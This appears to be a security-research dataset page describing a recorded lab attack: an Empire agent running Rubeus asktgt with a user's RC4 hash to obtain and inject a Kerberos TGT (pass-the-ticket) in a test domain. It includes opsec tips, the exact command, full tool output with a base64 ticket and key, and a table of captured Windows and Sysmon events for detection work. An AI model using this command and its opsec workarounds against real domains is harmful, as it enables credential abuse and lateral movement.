
# Empire Rubeus PTT

The asktgt action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4, /aes128, /aes256, or /des). A /password flag can also be used instead of a hash - in this case /enctype:X will default to RC4 for the exchange, with des|aes128|aes256 as options. If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The /luid:0xA.. flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.

Note that no elevated privileges are needed on the host to request TGTs or apply them to the current logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the /ptt option. A workaround is to use the /createnetonly:C:\X.exe parameter (which hides the process by default unless the /show flag is specified), or request the ticket and apply it to another logon session with ptt /luid:0xA..

## Technique(s) ID

T1097

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## dataset

[empire_rubeus_asktgt_ptt.tar.gz](./empire_rubeus_asktgt_ptt.tar.gz)

## Nnetwork Environment

Shire

## Time Taken

2019-03-19145126

## About this file

| log_name                                 | task                                                   |   record_number |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |             334 |
| Security                                 | Filtering Platform Connection                          |             301 |
| Security                                 | Token Right Adjusted Events                            |             180 |
| Security                                 | User Account Management                                |              51 |
| Security                                 | Detailed File Share                                    |              10 |
| Security                                 | Group Membership                                       |               9 |
| Security                                 | Logoff                                                 |               9 |
| Security                                 | Logon                                                  |               9 |
| Security                                 | Special Logon                                          |               9 |
| Security                                 | Process Termination                                    |               7 |
| Security                                 | Sensitive Privilege Use                                |               6 |
| Security                                 | File Share                                             |               1 |
| Security                                 | Kerberos Authentication Service                        |               1 |
| Security                                 | Other Object Access Events                             |               1 |
| Security                                 | Process Creation                                       |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             436 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             104 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |              90 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |              83 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              21 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |              20 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              14 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |               2 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |             279 |

## Empire Activity

```
Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /ptt
```

```
[*] Tasked 2MES3XN6 to run TASK_SHELL
[*] Agent 2MES3XN6 tasked with task ID 21
(Empire: 2MES3XN6) > ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68
[*] Using domain controller: HFDC01.shire.com (172.18.39.5)
[*] Building AS-REQ (w/ preauth) for: 'shire.com\Mmidge'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6xLDFM5i+GcjKhK
      ix5DoHwWPlrrbj4nPOcTyK/umBEnffx9hz7tu3acyQU127mvFR7u0JO3h6U6FPrKPz2iJ6v3sx5AYGM6
      Imf0J2NBWb3+AU0WmuOBCa3k/BL+jl49isw6CuWHKrqyOk7SaoRORdd9G0hDv5zpHeF5Nzfz4dQ3GqmO
      W2ORZuTQR868MYEFYnCIjY+wNf/ve9Cie6isW170KSEMPrWdQbeSFMu6KtJaCNLTc2800JTO3ObrOZUW
      zylDRelTgBY4FCTyBUaseF45EWwFyiMeeABhgUZ1iFPGezsplcczGpaYB19bLz2r89j5k+3IJGzyOcA9
      hECNycNVzycIcU4SUtKtxqiRLoPqfPjHq8codY1npbUsovsW6wEi25lgFxzlVdxF2Bek368qBU1B1s9g
      CL06GUSjlfjPj9Heb7exTr9r+4j4JL+qVZaqlBtAQ4J38CKNJ9RdZME/9wRg6I/E15P8NNUAr7IOyF6S
      cYlNQ07uRFRKBgi30JSdBC7CSe2x546Jrrd17YQtDOHbw1WFP7HvYgdT+Miuit/WoRttWmNTEv4vj6oD
      +AuTrQKxnhbebef6MXXsR4ouDrBIlIw6r5T476ezkbNJeQwB6oryMUOsI3wu3DDFdRD7ZBY869fSC7Xe
      1+6vRO4Vu/mUXYzw9xkJ0C7X+c4ljJetCZ/YV3zoc6Tw5WLjtfFJ0HuFdIxxOEj8xK0BoyGwnDz3fOGC
      mEjH47U/w0EsUdBmnsZzRTujrTwGFbm/oCjOV9Dgae/aVLe0A+TSrWH2H8aKFmGeczrtTgEkGZDJyudm
      bVdeymTc0bv8AT8s0moOKc64dhtib10LPnakbWDOSQOydi/abwuIaAB6+21F3cmZ9lq5/7e1LyYKWnxd
      ATHPz+M9kWJi+xeqombWvozrjM2uIozFik7nY0rMdrbd/ItlML7bCuOuybksFe/1mmwscWvCoTOePzNS
      NU2znzc8vDOSfaE5WLI9c1hJVjkarx9iL+kSM7N3yQEXkuwQuTY5Yswx1bht28sKjsU+Q0dZxdhNeErd
      lJekqyf5NAKI2fmawmWBmzcXm7NDRATgDf3N9tpiTOW0x0Blv2F+SWXparZ06E5wdqNsV4l2Yf9x6yOp
      exrQvjCznKbpbh0u1rlhm0Ya8yieDqbCKEIzxIk1IjYwx/4OQ6fdGAm6SjF+rH/Pnyh/o5X4DxLSeGEy
      LPDjuDBHuReqj4UP//bhH7r5UptZuQ+cZ5liu58eo4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw
      ga6gGzAZoAMCARehEgQQfj5vhePBJY0eMPFDHvkIxKELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN
      bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxODU1NDlaphEYDzIwMTkwMzIwMDQ1NTQ5WqcRGA8yMDE5
      MDMyNjE4NTU0OVqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=

[*] Action: Import Ticket
[+] Ticket successfully imported!

[*] Action: Describe Ticket

  UserName              :  Mmidge
  UserRealm             :  SHIRE.COM
  ServiceName           :  krbtgt/shire.com
  ServiceRealm          :  SHIRE.COM
  StartTime             :  3/19/2019 1:55:49 PM
  EndTime               :  3/19/2019 11:55:49 PM
  RenewTill             :  3/26/2019 1:55:49 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  fj5vhePBJY0eMPFDHvkIxA==


..Command execution completed.

(Empire: 2MES3XN6) > 
```